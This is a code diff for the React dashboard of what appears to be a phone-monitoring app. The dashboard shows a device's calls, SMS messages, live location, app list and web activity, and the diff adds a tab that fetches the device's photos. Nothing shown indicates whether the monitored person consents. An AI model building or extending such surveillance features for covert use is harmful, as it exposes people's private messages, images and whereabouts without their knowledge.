@@ -12,6 +12,7 @@ import WebActivityList from '../components/WebActivityList';
 import NotificationList from '../components/NotificationList';
 import InstalledAppList from '../components/InstalledAppList';
 import RemoteActions from '../components/RemoteActions';
+import GalleryView from '../components/GalleryView';
 import { 
   PhoneCall, 
   MessageSquare, 
@@ -83,6 +84,24 @@ function DashboardPage() {
       fetchData();
     }
   }, [token]);
+
+  const [mediaFiles, setMediaFiles] = useState([]);
+
+  useEffect(() => {
+    if (token && selectedDeviceId) {
+      const fetchMedia = async () => {
+        try {
+          const res = await dataService.getDeviceMedia(token, selectedDeviceId);
+          setMediaFiles(res.data);
+        } catch (error) {
+          console.error('Error fetching device media:', error);
+        }
+      };
+      fetchMedia();
+    } else {
+      setMediaFiles([]);
+    }
+  }, [token, selectedDeviceId]);
 
   const getStatus = (lastSeen) => {
     if (!lastSeen) return 'offline';
@@ -203,6 +222,9 @@ function DashboardPage() {
       case 'sms':
         return <SmsMessageTable smsMessages={filteredData.smsMessages} />;
 
+      case 'images':
+        return <GalleryView mediaFiles={mediaFiles} />;
+
       case 'notifications':
         return <NotificationList notifications={filteredData.notifications} />;
 
@@ -247,11 +269,11 @@ function DashboardPage() {
     { id: 'devices', label: 'Connected Devices' },
     { id: 'calls', label: 'Call History' },
     { id: 'sms', label: 'Messages' },
+    { id: 'images', label: 'Photos & Gallery' },
     { id: 'notifications', label: 'Notifications' },
     { id: 'location', label: 'Live Location' },
     { id: 'apps', label: 'App Inventory' },
     { id: 'web', label: 'Web Activity' },
-    { id: 'screen', label: 'Screen Time' },
   ].find(i => i.id === activeTab);
 
   return (
